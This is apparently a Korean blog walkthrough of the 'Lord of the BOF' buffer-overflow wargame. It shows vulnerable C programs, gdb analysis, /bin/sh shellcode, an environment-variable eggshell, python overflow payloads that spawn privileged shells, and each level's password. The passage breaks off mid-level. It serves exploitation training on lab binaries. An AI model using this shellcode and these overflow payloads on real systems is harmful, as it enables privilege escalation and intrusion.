---
layout: post
title: "The Lord of the BOF"
headline: The Lord of the BOF
modified: 2017-03-12
categories: Wargame LOB Pwnable XothSec
comments: true
featured: true
---

# settings

LOB Redhat은 bash의 버전이 낮아서 \xff를 \x00으로 처리한다. 이 사실을 알아도 문제를 풀다보면 가끔씩 까먹는 경우가 발생한다. 이를 원천적으로 해결하기 위해 각 유저의 bash를 bash2로 치환하자.

root / hackerschoolbof로 접속하여

vi /etc/passwd
``` bash2
:%s/bash/bash2/
```

를 통해 각 유저의 디폴트 쉘을 bash2로 바꾸자.

# gate

password is gate

### Problem

``` bash2
[gate@localhost gate]$ cat gremlin.c
/*
	The Lord of the BOF : The Fellowship of the BOF
	- gremlin
	- simple BOF
*/

int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

### Solution

문제에서 환경변수를 지우는 부분이 없으니 에그쉘을 이용해서 문제를 해결할 수 있을 것이다.

사용된 에그쉘 코드와 환경변수에서 에그쉘의 주소를 얻어오는 코드는 다음과 같다.

```c
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

int main(void)
{
	char msg[512];
	int i;

	for(i=0;i<511;i++)
		msg[i]='\x90';

	msg[511]=0;

	msg[0]='E';
	msg[1]='G';
	msg[2]='G';
	msg[3]='=';

	for(i=0;i<strlen(shellcode);i++)
	{
		msg[511-strlen(shellcode)+i]=shellcode[i];
	}

	putenv(msg);

	system("/bin/bash2");
}
```

```c
#include<stdio.h>

int main(void)
{
        char *addr;
        addr = getenv("EGG");
        printf("EGG addr : %p\n",addr);
}
```

이 바이너리를 gdb로 분석해보자.

``` bash2
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %ebp,%esp
0x8048433 <main+3>:	sub    %esp,0x100
0x8048439 <main+9>:	cmp    DWORD PTR [%ebp+8],1
0x804843d <main+13>:	jg     0x8048456 <main+38>
0x804843f <main+15>:	push   0x80484e0
0x8048444 <main+20>:	call   0x8048350 <printf>
0x8048449 <main+25>:	add    %esp,4
0x804844c <main+28>:	push   0
0x804844e <main+30>:	call   0x8048360 <exit>
0x8048453 <main+35>:	add    %esp,4
0x8048456 <main+38>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048459 <main+41>:	add    %eax,4
0x804845c <main+44>:	mov    %edx,DWORD PTR [%eax]
0x804845e <main+46>:	push   %edx
0x804845f <main+47>:	lea    %eax,[%ebp-256]
0x8048465 <main+53>:	push   %eax
0x8048466 <main+54>:	call   0x8048370 <strcpy>
0x804846b <main+59>:	add    %esp,8
0x804846e <main+62>:	lea    %eax,[%ebp-256]
0x8048474 <main+68>:	push   %eax
0x8048475 <main+69>:	push   0x80484ec
0x804847a <main+74>:	call   0x8048350 <printf>
0x804847f <main+79>:	add    %esp,8
0x8048482 <main+82>:	leave  
0x8048483 <main+83>:	ret  
```

buffer의 주소는 ebp-256인 것을 알 수 있다. 먼저 에그쉘을 실행시켜 환경변수에 쉘코드를 등록하고, 환경변수의 주소를 얻어온 뒤, 260바이트를 dummy 값으로 채우고 4바이트를 little endian에 맞춰 환경 변수의 주소로 넣어준다면 gremlin 권한의 쉘을 얻을 수 있다.


``` bash2
[gate@localhost gate]$ /tmp/eggshell/eggshell
[gate@localhost gate]$ ./gremli2
EGG addr : 0xbffffcc2
[gate@localhost gate]$ ./gremlin `python -c 'print "A"*260+"\xc2\xfc\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA참
bash$ id
uid=500(gate) gid=500(gate) euid=501(gremlin) egid=501(gremlin) groups=500(gate)
bash$ my-pass
euid = 501
hello bof world
```

# gremlin

password is hello bof world

### Problem

``` bash2
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

### Solution

gremlin 문제와 마찬가지로 해결할 수 있다.

``` gdb
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %ebp,%esp
0x8048433 <main+3>:	sub    %esp,16
0x8048436 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   0x80484d0
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    %esp,4
0x8048449 <main+25>:	push   0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    %esp,4
0x8048453 <main+35>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048456 <main+38>:	add    %eax,4
0x8048459 <main+41>:	mov    %edx,DWORD PTR [%eax]
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    %eax,[%ebp-16]
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    %esp,8
0x8048468 <main+56>:	lea    %eax,[%ebp-16]
0x804846b <main+59>:	push   %eax
0x804846c <main+60>:	push   0x80484dc
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    %esp,8
0x8048479 <main+73>:	leave  
0x804847a <main+74>:	ret    
```

``` bash2
[gremlin@localhost gremlin]$ /tmp/eggshell/eggshell
[gremlin@localhost gremlin]$ cp /tmp/eggshell/geteggaddr ./cobol2
[gremlin@localhost gremlin]$ ./cobol2
EGG addr : 0xbffffcb5
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "A"*20+"\xb5\xfc\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAA딱
bash$ id
uid=501(gremlin) gid=501(gremlin) euid=502(cobolt) egid=502(cobolt) groups=501(gremlin)
bash$ my-pass
euid = 502
hacking exposed
```

# cobolt

password is hacking exposed

### Problem

``` bash2
[cobolt@localhost cobolt]$ cat goblin.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
```

### Solution

이전 문제에서 argv[1]을 통해 bof를 했던것과 달리 stdin으로 bof를 한다. 이런 문제의 경우 gets() 함수가 끝난 뒤 EOF를 전송하기 때문에 쉘을 얻어도 EOF가 전송되면서 쉘이 바로 종료된다. 따라서 cat으로 따로 처리를 해주어야 한다.

cat은 stdin을 stdout으로 만들어주는 효과를 가지며 이를 파이프로 사용하여 쉘에 EOF 전송하지 않고 사용자의 입력을 쉘에 전송하는 효과를 얻을 수 있게한다.

``` bash2
0x80483f8 <main>:	push   %ebp
0x80483f9 <main+1>:	mov    %ebp,%esp
0x80483fb <main+3>:	sub    %esp,16
0x80483fe <main+6>:	lea    %eax,[%ebp-16]
0x8048401 <main+9>:	push   %eax
0x8048402 <main+10>:	call   0x804830c <gets>
0x8048407 <main+15>:	add    %esp,4
0x804840a <main+18>:	lea    %eax,[%ebp-16]
0x804840d <main+21>:	push   %eax
0x804840e <main+22>:	push   0x8048470
0x8048413 <main+27>:	call   0x804833c <printf>
0x8048418 <main+32>:	add    %esp,8
0x804841b <main+35>:	leave  
0x804841c <main+36>:	ret   
```

``` bash2
[cobolt@localhost cobolt]$ /tmp/eggshell/eggshell
[cobolt@localhost cobolt]$ cp /tmp/eggshell/geteggaddr ./gobli2
[cobolt@localhost cobolt]$ ./gobli2
EGG addr : 0xbffffcba
[cobolt@localhost cobolt]$ (python -c 'print "A"*20+"\xba\xfc\xff\xbf"';cat)  | ./goblin
AAAAAAAAAAAAAAAAAAAA빠
id
uid=502(cobolt) gid=502(cobolt) euid=503(goblin) egid=503(goblin) groups=502(cobolt)
my-pass
euid = 503
hackers proof
```

# goblin

password is hackers proof

### Problem

``` bash2
[goblin@localhost goblin]$ cat orc.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orc
        - egghunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);
}
```

### Solution

이전 문제들과 다르게 egg hunter가 적용되어 있어 eggshell로는 해결할 수 없고 buffer에 직접 쉘코드를 삽입하고 직접 뛰어야한다.

```
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048630
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	nop    
0x8048524 <main+36>:	mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:	nop    
0x804852c <main+44>:	lea    %esi,[%esi*1]
0x8048530 <main+48>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:	lea    %edx,[%eax*4]
0x804853a <main+58>:	mov    %eax,%ds:0x8049750
0x804853f <main+63>:	cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:	jne    0x8048547 <main+71>
0x8048545 <main+69>:	jmp    0x8048587 <main+135>
0x8048547 <main+71>:	mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:	lea    %edx,[%eax*4]
0x8048551 <main+81>:	mov    %eax,%ds:0x8049750
0x8048556 <main+86>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:	push   %edx
0x804855a <main+90>:	call   0x80483f0 <strlen>
0x804855f <main+95>:	add    %esp,4
0x8048562 <main+98>:	mov    %eax,%eax
---Type <return> to continue, or q <return> to quit---
0x8048564 <main+100>:	push   %eax
0x8048565 <main+101>:	push   0
0x8048567 <main+103>:	mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:	lea    %edx,[%eax*4]
0x8048571 <main+113>:	mov    %eax,%ds:0x8049750
0x8048576 <main+118>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:	push   %edx
0x804857a <main+122>:	call   0x8048430 <memset>
0x804857f <main+127>:	add    %esp,12
0x8048582 <main+130>:	inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:	jmp    0x8048530 <main+48>
0x8048587 <main+135>:	mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:	add    %eax,4
0x804858d <main+141>:	mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:	add    %edx,47
0x8048592 <main+146>:	cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:	je     0x80485b0 <main+176>
0x8048597 <main+151>:	push   0x804863c
0x804859c <main+156>:	call   0x8048410 <printf>
0x80485a1 <main+161>:	add    %esp,4
0x80485a4 <main+164>:	push   0
0x80485a6 <main+166>:	call   0x8048420 <exit>
0x80485ab <main+171>:	add    %esp,4
0x80485ae <main+174>:	mov    %esi,%esi
0x80485b0 <main+176>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:	add    %eax,4
0x80485b6 <main+182>:	mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:	push   %edx
0x80485b9 <main+185>:	lea    %eax,[%ebp-40]
0x80485bc <main+188>:	push   %eax
---Type <return> to continue, or q <return> to quit---
0x80485bd <main+189>:	call   0x8048440 <strcpy>
0x80485c2 <main+194>:	add    %esp,8
0x80485c5 <main+197>:	lea    %eax,[%ebp-40]
0x80485c8 <main+200>:	push   %eax
0x80485c9 <main+201>:	push   0x8048659
0x80485ce <main+206>:	call   0x8048410 <printf>
0x80485d3 <main+211>:	add    %esp,8
0x80485d6 <main+214>:	leave  
0x80485d7 <main+215>:	ret    
```

buf의 위치는 ebp-40이다. strcpy로 argv[1]을 복사하기 때문에 buf에 채워넣을 수 있는 스트링의 크기에 제한이 없다. 따라서 argv[1]을 dummy string(44) + Shellcode addr(4) + Nop(200) + Shellcode(25) + Nop(200)으로 총 473 바이트로 채울 수 있다.

Shellcode의 주소를 알아보기 위해 gdb를 이용하자 여기서 orc 자체는 디버깅 권한이 없으므로 or2로 복사하여 진행했다.

``` bash2
[goblin@localhost goblin]$ cp orc or2
[goblin@localhost goblin]$ gdb -q ~/or2
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1

.................

0x80485bd <main+189>:	call   0x8048440 <strcpy>
0x80485c2 <main+194>:	add    %esp,8
0x80485c5 <main+197>:	lea    %eax,[%ebp-40]
0x80485c8 <main+200>:	push   %eax
0x80485c9 <main+201>:	push   0x8048659
0x80485ce <main+206>:	call   0x8048410 <printf>
0x80485d3 <main+211>:	add    %esp,8
0x80485d6 <main+214>:	leave  
0x80485d7 <main+215>:	ret    
0x80485d8 <main+216>:	nop    
0x80485d9 <main+217>:	nop    
0x80485da <main+218>:	nop    
0x80485db <main+219>:	nop    
0x80485dc <main+220>:	nop    
0x80485dd <main+221>:	nop    
0x80485de <main+222>:	nop    
0x80485df <main+223>:	nop    
End of assembler dump.
(gdb) b * main+215
Breakpoint 1 at 0x80485d7
(gdb) r `python -c 'print "A"*44+"BBBB"+"C"*425'`
Starting program: /home/goblin/or2 `python -c 'print "A"*44+"BBBB"+"C"*425'`
stack is still your friend.

Program exited normally.
(gdb) r `python -c 'print "A"*44+"\xbf"*4+"C"*425'`
Starting program: /home/goblin/or2 `python -c 'print "A"*44+"\xbf"*4+"C"*425'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA옜옜CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Breakpoint 1, 0x80485d7 in main ()
(gdb) i r
Ambiguous info command "r": registers, remote-process.
(gdb) info registers
eax            0x1da	474
ecx            0x400	1024
edx            0x40106980	1074817408
ebx            0x401081ec	1074823660
esp            0xbffff93c	-1073743556
ebp            0x41414141	1094795585
esi            0x4000ae60	1073786464
edi            0xbffff984	-1073743484
eip            0x80485d7	134514135
eflags         0x286	646
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x0	0
cwd            0xffff037f	-64641
swd            0xffff0000	-65536
twd            0x0	0
fip            0x401e0178	1075708280
fcs            0x0	0
fopo           0x401f1648	1075779144
fos            0x0	0
(gdb) x/wx $esp
0xbffff93c:	0xbfbfbfbf
(gdb)
0xbffff940:	0x43434343
```

argv[1]에 473바이트를 넣으면 쉘코드의 시작 주소가 0xbffff940 임을 알 수 있다.
이를 통해 익스플로잇을 다음과 같이 작성할 수 있다.

"A"*44 (dummy byte)
+"\x40\xf9\xff\xbf" (shellcode addr)
+"\x90"*200 (Nop Sled)
+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" (shellcode)
+"\x90"*200 (Nop Sled)

``` bash2
[goblin@localhost goblin]$ ~/orc `python -c 'print "A"*44+"\x40\xf9\xff\xbf"+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*200'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@?퓧???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h//shh/bin??S??柰
?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
bash$ id
uid=503(goblin) gid=503(goblin) euid=504(orc) egid=504(orc) groups=503(goblin)
bash$ my-pass
euid = 504
cantata
```

# orc

password is cantata

### Problem

``` bash2
[orc@localhost orc]$ cat wolfman.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}
	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

### Solution

이전 문제에서 buffer 앞 부분을 비워주는 코드가 추가되었다. 하지만 이전 문제를 해결할 때 이미 버퍼 뒷영역을 이용하여 풀었기 때문에 익스플로잇에서 쉘코드 주소만 변경될 뿐 같은 방법으로 해결할 수 있다.

``` bash2
[orc@localhost orc]$ cp wolfman wolfma2
[orc@localhost orc]$ gdb -q ~/wolfma2
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048640
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4

.............

0x80485bd <main+189>:	call   0x8048440 <strcpy>
0x80485c2 <main+194>:	add    %esp,8
0x80485c5 <main+197>:	lea    %eax,[%ebp-40]
0x80485c8 <main+200>:	push   %eax
0x80485c9 <main+201>:	push   0x8048669
0x80485ce <main+206>:	call   0x8048410 <printf>
0x80485d3 <main+211>:	add    %esp,8
0x80485d6 <main+214>:	push   40
0x80485d8 <main+216>:	push   0
0x80485da <main+218>:	lea    %eax,[%ebp-40]
0x80485dd <main+221>:	push   %eax
0x80485de <main+222>:	call   0x8048430 <memset>
0x80485e3 <main+227>:	add    %esp,12
0x80485e6 <main+230>:	leave  
0x80485e7 <main+231>:	ret    
0x80485e8 <main+232>:	nop    
0x80485e9 <main+233>:	nop    
0x80485ea <main+234>:	nop    
0x80485eb <main+235>:	nop    
0x80485ec <main+236>:	nop    
0x80485ed <main+237>:	nop    
0x80485ee <main+238>:	nop    
0x80485ef <main+239>:	nop    
End of assembler dump.
(gdb) b *main+231
Breakpoint 1 at 0x80485e7
(gdb) r `python -c 'print "\xbf"*473'`
Starting program: /home/orc/wolfma2 `python -c 'print "\xbf"*473'`
옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜

Breakpoint 1, 0x80485e7 in main ()
(gdb) x/wx $esp
0xbffff94c:	0xbfbfbfbf
(gdb)
0xbffff950:	0xbfbfbfbf
```

쉘코드 시작 주소는 0xbffff950이다.

익스플로잇 코드는 다음과 같이 작성할 수 있다.

"A"*44 (dummy byte)
+"\x50\xf9\xff\xbf" (shellcode addr)
+"\x90"*200 (Nop Sled)
+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" (shellcode)
+"\x90"*200 (Nop Sled)

``` bash2
[orc@localhost orc]$ ~/wolfman `python -c 'print "A"*44+"\x50\xf9\xff\xbf"+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*200'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP?퓧???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1픐h//shh/bin??S??柰
                                       ?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
bash$ id
uid=504(orc) gid=504(orc) euid=505(wolfman) egid=505(wolfman) groups=504(orc)
bash$ my-pass
euid = 505
love eyuna
```

# wolfman

password is love eyuna

### Problem

``` bash2
[wolfman@localhost wolfman]$ cat darkelf.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

### Solution

이 문제는 argv[1]의 길이 체크까지 추가되었다.
하지만 argc 즉 argv의 개수는 고정되어 있지 않으므로 argv[2]에 쉘코드를 넣고 점프하면 된다.

이전 문제들과 마찬가지로 gdb를 통해 쉘코드의 주소를 확인해보자.

``` bash2
[wolfman@localhost wolfman]$ cp darkelf darkel2
[wolfman@localhost wolfman]$ gdb -q darkel2
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],1
0x804850a <main+10>:	jg     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048670
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	nop    
0x8048524 <main+36>:	mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:	nop    
0x804852c <main+44>:	lea    %esi,[%esi*1]
0x8048530 <main+48>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:	lea    %edx,[%eax*4]
0x804853a <main+58>:	mov    %eax,%ds:0x80497a4
0x804853f <main+63>:	cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:	jne    0x8048547 <main+71>
0x8048545 <main+69>:	jmp    0x8048587 <main+135>
0x8048547 <main+71>:	mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:	lea    %edx,[%eax*4]
0x8048551 <main+81>:	mov    %eax,%ds:0x80497a4
0x8048556 <main+86>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:	push   %edx
0x804855a <main+90>:	call   0x80483f0 <strlen>
0x804855f <main+95>:	add    %esp,4
0x8048562 <main+98>:	mov    %eax,%eax
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) b *main+6
Breakpoint 1 at 0x8048506
(gdb) r `python -c 'print "\xbf"*48'` `python -c 'print "A"*425'`
Starting program: /home/wolfman/darkel2 `python -c 'print "\xbf"*48'` `python -c 'print "A"*425'`

Breakpoint 1, 0x8048506 in main ()
(gdb) x/wx $ebp+0xc
0xbffff924:	0xbffff964
(gdb) x/s 0xbffff964+8
0xbffff96c:	 "??
(gdb) x/wx 0xbffff964
0xbffff964:	0xbffffa63
(gdb)
0xbffff968:	0xbffffa79
(gdb)
0xbffff96c:	0xbffffaaa
(gdb) x/s 0xbffffaaa
0xbffffaaa:	 'A' <repeats 200 times>...
```

argv[2] 즉 쉘코드의 주소는 0xbffffaaa이다.

따라서 다음과 같은 익스플로잇 코드를 작성할 수 있다.

argv[1] = "A"*44 (dummy byte)
+"\xaa\xfa\xff\xbf" (shellcode addr)

argv[2] = "\x90"*200 (Nop Sled)
+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" (shellcode)
+"\x90"*200 (Nop Sled)

``` bash2
[wolfman@localhost wolfman]$ ~/darkelf `python -c 'print "A"*44+"\xaa\xfa\xff\xbf"'` `python -c 'print "\x90"*200+"\x90"*200+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*200'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?
bash$ id
uid=505(wolfman) gid=505(wolfman) euid=506(darkelf) egid=506(darkelf) groups=505(wolfman)
bash$ my-pass
euid = 506
kernel crashed
```

# darkelf

password is kernel crashed

### Problem

``` bash2
[darkelf@localhost darkelf]$ cat orge.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - orge
        - check argv[0]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// here is changed!
	if(strlen(argv[0]) != 77){
                printf("argv[0] error\n");
                exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

이전 문제에서 argv[0] 길이 체크만 추가되었다. argv[0]은 보통 실행되는 프로그램의 이름 자체이다. 따라서 symbolic link를 이용하여 프로그램의 이름을 바꾸면 된다.

``` bash2
[darkelf@localhost darkelf]$ ln -s orge `python -c 'print "A"*63'`
[darkelf@localhost darkelf]$ ~/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA hi
stack is still your friend.
```

symbl link를 이용해 argv[0] 길이 체크를 통과할 수 있음을 볼 수 있다.

그런 다음 앞의 문제와 같은 방식으로 문제를 풀어내면 된다.

gdb를 통해 argv[2]의 주소를 알아보자.

``` bash2
[darkelf@localhost darkelf]$ cp orge `python -c 'print "B"*63'`
[darkelf@localhost darkelf]$ gdb -q BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
(gdb) r `python -c 'print "\xbf"*48'` `python -c 'print "A"*425'`
Starting program: /home/darkelf/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB `python -c 'print "\xbf"*48'` `python -c 'print "A"*425'`
옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜옜

Program received signal SIGSEGV, Segmentation fault.
0xbfbfbfbf in ?? ()
(gdb) disass main
Dump of assembler code for function main:
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %esp,%ebp
0x8048503 <main+3>:	sub    $0x2c,%esp
